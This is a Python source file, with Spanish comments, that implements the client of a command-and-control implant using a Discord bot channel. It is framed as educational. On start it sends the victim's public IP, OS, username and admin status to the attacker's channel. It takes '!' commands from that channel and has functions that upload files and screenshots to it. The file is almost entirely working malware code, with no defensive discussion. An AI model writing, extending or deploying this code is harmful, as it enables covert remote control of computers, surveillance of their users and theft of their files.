"""
Módulo de Comando y Control (C2) vía Discord
Propósito educativo: Entender arquitectura C2 y cómo los atacantes usan plataformas legítimas
"""

import os
import io
import asyncio
import discord
from datetime import datetime


class DiscordC2Client:
    """
    Clase 4: Cliente C2 que se comunica con bot de Discord
    """
    
    def __init__(self, bot_token, channel_id):
        self.bot_token = bot_token
        self.channel_id = int(channel_id)
        self.client = discord.Client(intents=discord.Intents.all())
        self.session_id = None
        self.command_queue = asyncio.Queue()
        self.connected = False
        
        # Event handlers
        @self.client.event
        async def on_ready():
            self.connected = True
            await self._register_session()
        
        @self.client.event
        async def on_message(message):
            if message.channel.id != self.channel_id:
                return
            # Ignorar todos los bots (incluye el bot atacante)
            if message.author.bot:
                return
            
            await self._handle_command(message)
    
    async def _register_session(self):
        """Registra nueva sesión con el C2"""
        # Obtener info del sistema
        import platform
        import socket
        import json
        import urllib.request
        
        # IP pública
        public_ip = 'unknown'
        try:
            with urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5) as r:
                public_ip = json.loads(r.read())['ip']
        except:
            pass
        
        # Info del usuario
        username = os.getenv('USERNAME', 'unknown')
        is_admin = False
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            pass
        
        embed = discord.Embed(
            title="Nueva sesión iniciada",
            description=f"ID: {self.session_id}",
            color=0x00ff00,
            timestamp=datetime.now()
        )
        embed.add_field(name="IP Pública", value=public_ip, inline=True)
        embed.add_field(name="Sistema", value=platform.platform(), inline=False)
        embed.add_field(name="Usuario", value=username, inline=True)
        embed.add_field(name="Admin", value="✅ Sí" if is_admin else "❌ No", inline=True)
        
        channel = self.client.get_channel(self.channel_id)
        await channel.send(embed=embed)
    
    async def _handle_command(self, message):
        """Procesa comandos recibidos del C2"""
        content = message.content.strip()
        
        if not content.startswith('!'):
            return
        
        parts = content[1:].split()
        command = parts[0].lower()
        args = parts[1:]
        
        # Encolar comando para procesamiento
        await self.command_queue.put({
            'command': command,
            'args': args,
            'message': message
        })
    
    async def send_system_info(self, info_dict):
        """Envía información del sistema al C2"""
        embed = discord.Embed(
            title="Información del sistema",
            color=0x3498db,
            timestamp=datetime.now()
        )
        
        # Sistema
        sys_info = info_dict.get('system', {})
        embed.add_field(
            name="Sistema Operativo",
            value=f"{sys_info.get('platform', 'N/A')}",
            inline=False
        )
        
        # Usuario
        user_info = info_dict.get('user', {})
        embed.add_field(
            name="Usuario",
            value=f"{user_info.get('username', 'N/A')} "
                  f"(Admin: {user_info.get('is_admin', False)})",
            inline=True
        )
        
        # Red
        net_info = info_dict.get('network', {})
        embed.add_field(
            name="IP Pública",
            value=net_info.get('public_ip', 'N/A'),
            inline=True
        )
        
        # Hardware
        hw_info = info_dict.get('hardware', {})
        if 'memory' in hw_info:
            ram_gb = hw_info['memory'].get('total', 0) / (1024**3)
            embed.add_field(
                name="RAM",
                value=f"{ram_gb:.2f} GB",
                inline=True
            )
        
        channel = self.client.get_channel(self.channel_id)
        await channel.send(embed=embed)
    
    async def send_file(self, file_path, filename=None):
        """Envía archivo al C2"""
        if not os.path.exists(file_path):
            await self.send_message(f"❌ Archivo no encontrado: {file_path}")
            return
        
        filename = filename or os.path.basename(file_path)
        
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # Si es muy grande, comprimir o dividir
        if len(file_data) > 8 * 1024 * 1024:  # 8MB límite Discord
            await self.send_message(
                f"⚠️ Archivo demasiado grande: {len(file_data)} bytes"
            )
            return
        
        channel = self.client.get_channel(self.channel_id)
        file_obj = discord.File(io.BytesIO(file_data), filename=filename)
        await channel.send(file=file_obj)
    
    async def send_screenshot(self, image_data):
        """Envía captura de pantalla"""
        channel = self.client.get_channel(self.channel_id)
        file_obj = discord.File(
            io.BytesIO(image_data), 
            filename=f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        )
        await channel.send("Captura de pantalla:", file=file_obj)
    
    async def send_message(self, text):
        """Envía mensaje de texto"""
        channel = self.client.get_channel(self.channel_id)
        await channel.send(text)